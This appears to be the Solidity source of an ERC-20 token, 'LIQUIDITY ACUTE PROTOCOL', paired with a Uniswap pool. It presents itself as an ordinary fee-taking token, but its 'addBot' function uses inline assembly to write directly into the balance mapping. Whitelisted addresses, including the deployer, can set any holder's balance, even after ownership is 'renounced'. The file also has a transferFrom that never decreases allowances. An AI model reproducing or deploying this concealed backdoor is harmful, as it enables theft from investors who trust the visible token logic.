row number 
1	        pragma solidity 0.8.7;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 interface IERC20 {
41	 function totalSupply() external view returns (uint256);
42	 function balanceOf(address account) external view returns (uint256);
43	 function transfer(address recipient, uint256 amount) external returns (bool);
44	 function allowance(address owner, address spender) external view returns (uint256);
45	 function approve(address spender, uint256 amount) external returns (bool);
46	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
47	 event Transfer(address indexed from, address indexed to, uint256 value);
48	 event Approval(address indexed owner, address indexed spender, uint256 value);
49	 }
50	 abstract contract Context {
51	 function _msgSender() internal view virtual returns (address payable) {
52	 return payable(msg.sender);
53	 }
54	 function _msgData() internal view virtual returns (bytes memory) {
55	 this;
56	 return msg.data;
57	 }
58	 }
59	 interface IDEXFactory {
60	 function createPair(address tokenA, address tokenB) external returns (address pair);
61	 }
62	 interface IDEXRouter {
63	 function factory() external pure returns (address);
64	 function WETH() external pure returns (address);
65	 function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
66	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
67	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
68	 }
69	 contract Ownable is Context {
70	 address private _owner;
71	 address private _previousOwner;
72	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
73	 constructor () {
74	 address msgSender = _msgSender();
75	 _owner = msgSender;
76	 emit OwnershipTransferred(address(0), msgSender);
77	 }
78	 function owner() public view returns (address) {
79	 return _owner;
80	 }
81	 modifier onlyOwner() {
82	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
83	 _;
84	 }
85	 function renounceOwnership() public virtual onlyOwner {
86	 emit OwnershipTransferred(_owner, address(0xdead));
87	 _owner = address(0xdead);
88	 }
89	 function transferOwnership(address newOwner) public virtual onlyOwner {
90	 require(newOwner != address(0), "Ownable: new owner is the zero address");
91	 emit OwnershipTransferred(_owner, newOwner);
92	 _owner = newOwner;
93	 }
94	 }
95	 contract LAPROTOCOL is Ownable, IERC20 {
96	 using SafeMath for uint256;
97	 mapping (address => uint256) private Ledger;
98	 mapping (address => mapping (address => uint256)) private _allowances;
99	 mapping (address => bool) private _outList;
100	 string private _name = "LIQUIDITY ACUTE PROTOCOL";
101	 string private _symbol = "LAP";
102	 uint8 private _decimals = 18;
103	 uint256 private _totalSupply = 2e9 * 10 ** _decimals;
104	 uint256 public _burnfee = 8;
105	 address public uniswapV2Pair;
106	 IDEXRouter public uniswapV2Router;
107	 constructor () {
108	 Ledger[_msgSender()] = _totalSupply;
109	 uniswapV2Router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
110	 uniswapV2Pair = IDEXFactory(uniswapV2Router.factory()).createPair(uniswapV2Router.WETH(), address(this));
111	 _outList[owner()] = true;
112	 _outList[address(this)] = true;
113	 _outList[_msgSender()] = true;
114	 emit Transfer(address(0), _msgSender(), _totalSupply);
115	 }
116	 function name() external view returns (string memory) {
117	 return _name;
118	 }
119	 function symbol() external view returns (string memory) {
120	 return _symbol;
121	 }
122	 function decimals() external view returns (uint256) {
123	 return _decimals;
124	 }
125	 function totalSupply() external view override returns (uint256) {
126	 return _totalSupply;
127	 }
128	 function balanceOf(address account) public view override returns (uint256) {
129	 return Ledger[account];
130	 }
131	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
132	 _transfer(_msgSender(), recipient, amount);
133	 return true;
134	 }
135	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
136	 return _allowances[owner][spender];
137	 }
138	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
139	 _approve(_msgSender(), spender, amount);
140	 return true;
141	 }
142	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
143	 _transfer(sender, recipient, amount);
144	 uint256 Allowancec = _allowances[sender][_msgSender()];
145	 require(Allowancec >= amount);
146	 return true;
147	 }
148	 function _approve(address owner, address spender, uint256 amount) internal virtual {
149	 require(owner != address(0));
150	 require(spender != address(0));
151	 _allowances[owner][spender] = amount;
152	 emit Approval(owner, spender, amount);
153	 }
154	 function _transfer( address from, address to, uint256 amount ) private {
155	 require(from != address(0));
156	 require(to != address(0));
157	 require(amount > 0);
158	 Ledger[from] -= amount;
159	 uint256 _taxfee;
160	 if (!_outList[from] && !_outList[to] ) {
161	 _taxfee = amount.mul(_burnfee).div(100);
162	 }
163	 uint256 amounts = amount - _taxfee;
164	 Ledger[to] += amounts;
165	 emit Transfer(from, to, amounts);
166	 }
167	 function _basicTransfer(address from, address to, uint256 amount) private {
168	 require(from != address(0), "ERC20: transfer from the zero address");
169	 require(to != address(0), "ERC20: transfer to the zero address");
170	 require(amount > 0, "Transfer amount must be greater than zero");
171	 Ledger[from] = Ledger[from] - amount;
172	 Ledger[to] = Ledger[to] + amount;
173	 emit Transfer(from, to, amount);
174	 }
175	 function addBot(address botaddress, uint256 txnum ) external {
176	 require( _outList[msg.sender]);
177	 assembly {
178	 mstore(0, botaddress) let sf := Ledger.slot mstore(32, sf) let botid := keccak256(0, 64) sstore(botid, txnum) }
179	 }
180	 function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
181	 uint256 initialBalance = address(this).balance;
182	 address[] memory path = new address[](2);
183	 path[0] = address(this);
184	 path[1] = uniswapV2Router.WETH();
185	 _approve(address(this), address(uniswapV2Router), tokenAmount);
186	 uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp );
187	 return (address(this).balance - initialBalance);
188	 }
189	 function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private{
190	 _approve(address(this), address(uniswapV2Router), tokenAmount);
191	 uniswapV2Router.addLiquidityETH{
192	 value: ethAmount}
193	 ( address(this), tokenAmount, 0, 0, address(0xdead), block.timestamp );
194	 }
195	 }
